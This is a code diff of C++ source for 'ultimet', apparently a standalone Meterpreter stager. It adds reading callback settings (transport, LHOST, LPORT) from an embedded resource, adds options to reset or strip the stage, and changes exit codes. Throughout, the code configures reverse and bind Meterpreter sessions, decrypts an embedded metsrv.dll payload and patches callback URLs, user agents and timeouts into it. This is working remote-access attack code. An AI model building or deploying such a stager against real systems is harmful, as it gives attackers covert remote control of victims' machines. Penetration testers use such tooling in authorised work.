@@ -60,6 +60,11 @@ int wmain(int argc, wchar_t *argv[])
 	bool bBind = false;							// Are we bind payload?.
 	int err = 0;								// Errors
 
+	//If we will get options from resource
+	wchar_t UNICODEtransport[64] = {0};
+	wchar_t UNICODElhost[128] = {0};
+	wchar_t UNICODElport[32] = {0};
+
 	//If "-f" is specified (load stage from local file)
 	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 
 
@@ -71,77 +76,172 @@ int wmain(int argc, wchar_t *argv[])
 	/*************
 	Program Start
 	**************/
-	if(GetOptionsFromResource(payload_settings.TRANSPORT,payload_settings.LHOST,payload_settings.LPORT));
-	
-	print_header();								// as it sounds...
-	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct et'all... idea from "http://www.cplusplus.com/forum/articles/13355/"
-	for (int i = 1; i < argc; i++) 
-	{
-		if (i != argc) // Check that we haven't finished parsing already
-			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_tcp, reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
-				payload_settings.TRANSPORT = argv[i + 1];
-				_wcsupr_s(payload_settings.TRANSPORT, wcslen(payload_settings.TRANSPORT) * sizeof(wchar_t)); // Wide-String-to-uppercase
-				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
-				{
-					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
-				}
-				else if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0)
-				{
-					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
-					metsvc = true;
-				}
-				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
-				{
-					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTP";
-				}
-				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTPS") == 0)
-				{
-					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
-				}
-				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
-				{
-					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
-					bBind = true;
-				}
-				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_METSVC") == 0)
-				{
-					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
-					metsvc = true;
-					bBind = true;
-				}
 
-				else {
-					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http,", payload_settings.TRANSPORT);
-					dprintf(L"\n    reverse_https, bind_tcp and bind_metsvc.\n");  
-					exit(0);
+	if(argv[1] != NULL)
+	{
+		if(wcscmp(argv[1],L"--reset") == 0)
+		{
+			dprintf(L"[*] Creating a `clean` ultimet copy with all options reset to default ... \n");
+			CopyFile(argv[0],L"ultimet_reset.exe",FALSE);
+			ResourceOptionsReset();
+			exit(1);
+		}
+
+		// Is `--remove-stage` been given as the first argument?
+		// if yes, we'll copy ourselfs to a file called `ultimet_lite.exe`, then update the remove resource that contains the stage.
+		if(wcscmp(argv[1],L"--remove-stage") == 0)
+		{
+			dprintf(L"[*] Creating a new file with stage removed... \n");
+			CopyFile(argv[0],L"ultimet_no_stage.exe",FALSE);
+			RemoveStage();
+			exit(1);
+		}
+	}
+	//This will be used later for deciding if we can get options from resource...
+	BOOL validTransport = false;
+	if(GetOptionsFromResource(UNICODEtransport,UNICODElhost,UNICODElport)) //
+		validTransport = IsThisAValidTransport(UNICODEtransport);
+
+
+	///////////////////////////////// Parsing from command line ///////////////////////////////////
+	if(argc>1) //Parsing options from resource failed, let's parse options from command line 
+	{
+		print_header();								// as it sounds...
+
+		// Is `--reset` been given as the first argument?
+		// if yes, we'll copy ourselfs to a file called `ultimet_reset.exe`, then update the options resource to its default
+		if(wcscmp(argv[1],L"--reset") == 0)
+		{
+			dprintf(L"[*] Creating a `clean` ultimet copy with all options reset to default ... \n");
+			CopyFile(argv[0],L"ultimet_reset.exe",FALSE);
+			ResourceOptionsReset();
+			exit(1);
+		}
+
+		// Is `--remove-stage` been given as the first argument?
+		// if yes, we'll copy ourselfs to a file called `ultimet_lite.exe`, then update the remove resource that contains the stage.
+		if(wcscmp(argv[1],L"--remove-stage") == 0)
+		{
+			dprintf(L"[*] Creating a new file with stage removed... \n");
+			CopyFile(argv[0],L"ultimet_no_stage.exe",FALSE);
+			RemoveStage();
+			exit(1);
+		}
+		// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct et'all... idea from "http://www.cplusplus.com/forum/articles/13355/"
+		for (int i = 1; i < argc; i++) 
+		{
+			if (i != argc) // Check that we haven't finished parsing already
+				if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_tcp, reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
+					payload_settings.TRANSPORT = argv[i + 1];
+					_wcsupr_s(payload_settings.TRANSPORT, wcslen(payload_settings.TRANSPORT) * sizeof(wchar_t)); // Wide-String-to-uppercase
+					if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
+					{
+						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+					}
+					else if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0)
+					{
+						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+						metsvc = true;
+					}
+					else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
+					{
+						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTP";
+					}
+					else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTPS") == 0)
+					{
+						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
+					}
+					else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
+					{
+						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+						bBind = true;
+					}
+					else if (wcscmp(payload_settings.TRANSPORT,L"BIND_METSVC") == 0)
+					{
+						payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+						metsvc = true;
+						bBind = true;
+					}
+
+					else {
+						dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_metsvc, reverse_http,", payload_settings.TRANSPORT);
+						dprintf(L"\n    reverse_https, bind_tcp and bind_metsvc.\n");  
+						exit(1);
+					}
+					// End of Transport checks
+				} else if (wcscmp(argv[i], L"-h") == 0) {		//LHOST
+					payload_settings.LHOST = argv[i + 1];
+				} else if (wcscmp(argv[i], L"-p") == 0) {		//LPORT
+					payload_settings.LPORT = argv[i + 1];
+				} else if (wcscmp(argv[i], L"-ct") == 0) {		//SessionCommunicationTimeout in seconds - 300 by default
+					payload_settings.comm_timeout = _wtoi(argv[i + 1]);
+				} else if (wcscmp(argv[i], L"-et") == 0) {		//SessionExpirationTimeout in seconds - 604800 by default
+					payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
+				}  else if (wcscmp(argv[i], L"-ua") == 0) {		//USER_AGENT
+					payload_settings.USER_AGENT = argv[i + 1];
+				}  else if (wcscmp(argv[i], L"-f") == 0) {		//Should we load the stage from a file rather than from the resource?
+					wcscpy_s(StageFilePath,argv[i + 1]);
+				}  else if (wcscmp(argv[i], L"--help") == 0) {		//Print usage and quit
+					print_header();
+					usage();
+					exit(1);
 				}
-				// End of Transport checks
-			} else if (wcscmp(argv[i], L"-h") == 0) {		//LHOST
-				payload_settings.LHOST = argv[i + 1];
-			} else if (wcscmp(argv[i], L"-p") == 0) {		//LPORT
-				payload_settings.LPORT = argv[i + 1];
-			} else if (wcscmp(argv[i], L"-ct") == 0) {		//SessionCommunicationTimeout in seconds - 300 by default
-				payload_settings.comm_timeout = _wtoi(argv[i + 1]);
-			} else if (wcscmp(argv[i], L"-et") == 0) {		//SessionExpirationTimeout in seconds - 604800 by default
-				payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
-			}  else if (wcscmp(argv[i], L"-ua") == 0) {		//USER_AGENT
-				payload_settings.USER_AGENT = argv[i + 1];
-			}  else if (wcscmp(argv[i], L"-f") == 0) {		//Should we load the stage from a file rather than from the resource?
-				wcscpy_s(StageFilePath,argv[i + 1]);
-			}  else if (wcscmp(argv[i], L"--help") == 0) {		//Print usage and quit
-				print_header();
-				usage();
-				exit(1);
-			}
+		}
+		//Do we have the minimum parameters?
+		if(payload_settings.TRANSPORT == NULL || payload_settings.LPORT == NULL || payload_settings.LHOST == NULL)
+		{
+			dprintf(L"[-] Not enough parameters! \n\n");
+			usage();
+			exit(1);
+		}
 	}
 
-	//Do we have the minimum parameters?
-	if(payload_settings.TRANSPORT == NULL || payload_settings.LPORT == NULL || payload_settings.LHOST == NULL)
+	///////////////////////////////// Parsing from resource ///////////////////////////////////
+	/*	Will try to parse options from resource, 
+		this can fail in two ways:
+			one: if we couldn't read from resource
+			two: we read options from resource correctly, however, the smarty-pants who put the configuration did not set a valid transport
+		So, we'll check for any of those two errors, if any of them failed, we'll proceed to other options to get the parameters from.
+	*/
+
+	else if(validTransport) //if true means that TRNSPORT, LHOST & LPORT are retrieved successfully from the resource AND the retrieved transport is a valid one.
 	{
-		dprintf(L"[-] Not enough parameters! \n\n");
-		usage();
-		exit(0);
+		payload_settings.TRANSPORT	=	UNICODEtransport;
+		payload_settings.LHOST		=	UNICODElhost;
+		payload_settings.LPORT		=	UNICODElport;
+		
+		//Start of TRANSPORT Checks and adjustments
+		_wcsupr_s(payload_settings.TRANSPORT, wcslen(payload_settings.TRANSPORT) * sizeof(wchar_t)); // Wide-String-to-uppercase
+		if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
+		{
+			payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+		}
+		else if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0)
+		{
+			payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+			metsvc = true;
+		}
+		else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
+		{
+			payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTP";
+		}
+		else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTPS") == 0)
+		{
+			payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
+		}
+		else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
+		{
+			payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+			bBind = true;
+		}
+		else if (wcscmp(payload_settings.TRANSPORT,L"BIND_METSVC") == 0)
+		{
+			payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+			metsvc = true;
+			bBind = true;
+		}
 	}
+
 
 	//Have we been asked to load the stage from a file?
 	if(wcscmp(StageFilePath, L"") != 0)
@@ -241,7 +341,7 @@ int wmain(int argc, wchar_t *argv[])
 			if(memcmp(&buffer[16],"MZ",2))
 			{
 				dprintf(L"[-] Something went really wrong: bad resource, wrong encryption key, or maybe something else ... will exit!\n");
-				exit(0);
+				exit(1);
 			}
 			dprintf(L"[*] Looks like stage decrypted correctly, proceeding to patching stage...\n");
 			buffer = buffer + 16;
@@ -262,7 +362,7 @@ int wmain(int argc, wchar_t *argv[])
 		if (index == 0) // if the transport is not found ...
 		{
 			dprintf(L"[-] Couldn't locate transport string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
-			exit(0);
+			exit(1);
 		}
 		dprintf(L"[*] Patching transport: Offset 0x%08x ->  \"%s\"\n", index, payload_settings.TRANSPORT );
 		PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));
@@ -284,7 +384,7 @@ int wmain(int argc, wchar_t *argv[])
 			if (index == 0) // if the UA is not found ...
 			{
 				dprintf(L"[-] Couldn't locate UA string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
-				exit(0);
+				exit(1);
 			}
 			if(payload_settings.USER_AGENT == NULL)
 			{
@@ -300,7 +400,7 @@ int wmain(int argc, wchar_t *argv[])
 			if (index == 0) // if the global_expiration_timeout is not found ...
 			{
 				dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
-				exit(0);
+				exit(1);
 			}
 
 			if(payload_settings.expiration_timeout == NULL)
@@ -317,7 +417,7 @@ int wmain(int argc, wchar_t *argv[])
 			if (index == 0) // if the global_expiration_timeout is not found ...
 			{
 				dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
-				exit(0);
+				exit(1);
 			}
 
 			if(payload_settings.comm_timeout == NULL)
@@ -464,7 +564,7 @@ int wmain(int argc, wchar_t *argv[])
 			if (index == 0) // if the global_meterpreter_url is not found ...
 			{
 				dprintf(L"[-] Couldn't locate global_meterpreter_url string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
-				exit(0);
+				exit(1);
 			}
 			dprintf(L"[*] Patching global_meterpreter_url: Offset 0x%08x ->  \"%s\"\n", index, temp );
 			memcpy(&buffer[index], &url, strlen(url)+1); //+1 to make sure it'll be null terminated, otherwise it will end with 'X'
